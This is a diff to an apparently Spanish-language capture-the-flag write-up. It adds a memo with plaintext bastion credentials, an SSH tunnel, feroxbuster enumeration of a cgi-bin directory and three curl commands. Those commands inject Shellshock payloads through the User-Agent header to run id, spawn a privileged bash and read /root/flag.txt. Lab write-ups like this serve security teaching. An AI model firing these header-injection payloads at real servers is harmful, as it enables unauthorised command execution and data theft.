@@ -72,11 +72,34 @@ Al no encontrar nada, vamos a mirar la web que hay en el puerto 8888. Tampoco ve
 
 
 
+```
+MEMORANDUM - IT INFRASTRUCTURE & OPERATIONS
+Ref: Bastion Access Credentials
+
+Temporary maintenance account provisioned for network administration:
+Username: operator
+Password: gatekeeper2026
+
+Note: All bastion access sessions are logged to the central audit collector.
+```
+
+
+ssh -N -f -L 8081:10.55.5.20:80 operator@172.18.0.2
+
+feroxbuster -u  http://127.0.0.1:8081/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+
+feroxbuster -u  http://127.0.0.1:8081/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,js,cgi,py,pl,sh
+
 ---
 
 ## 👑 3. Escalada de Privilegios
 
 
+curl -i -H 'User-Agent: () { :; }; echo; echo; /bin/bash -c "id"' http://127.0.0.1:8081/cgi-bin/status.sh
+
+curl -i -H 'User-Agent: () { :; }; echo; echo; /bin/bash -c -p "/usr/bin/env /bin/bash -p"' http://127.0.0.1:8081/cgi-bin/status.sh
+
+curl -i -H 'User-Agent: () { :; }; echo; echo; /bin/bash -c -p "/usr/bin/env /bin/bash -p -c \"cat /root/flag.txt\""' http://127.0.0.1:8081/cgi-bin/status.sh
 
 
 
